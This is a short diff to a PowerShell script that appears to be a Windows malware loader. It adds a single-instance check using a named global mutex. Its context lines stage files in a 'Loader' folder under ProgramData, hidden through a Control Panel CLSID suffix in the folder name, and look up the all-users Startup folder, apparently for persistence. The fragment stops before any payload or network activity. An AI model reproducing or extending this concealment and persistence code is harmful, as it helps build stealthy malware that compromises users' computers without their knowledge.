@@ -1,3 +1,23 @@
+$AppId = "haideptraii"
+$mutexName = "Global\$AppId"
+$CreatedNew = $false
+
+try {
+    # Kiểm tra xem Mutex đã tồn tại chưa
+    $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
+    Write-Host "[!] An instance of this script is already running."
+    Stop-Process -Id $PID -Force
+} catch {
+    # Nếu Mutex chưa tồn tại, tạo mới
+    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$CreatedNew)
+}
+
+# Nếu không tạo được Mutex mới, thoát script
+if (-not $CreatedNew) {
+    Write-Host "[!] Another instance is already running."
+    Stop-Process -Id $PID -Force
+}
+
 $rdir = "$env:SystemDrive\ProgramData\Loader"
 $dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
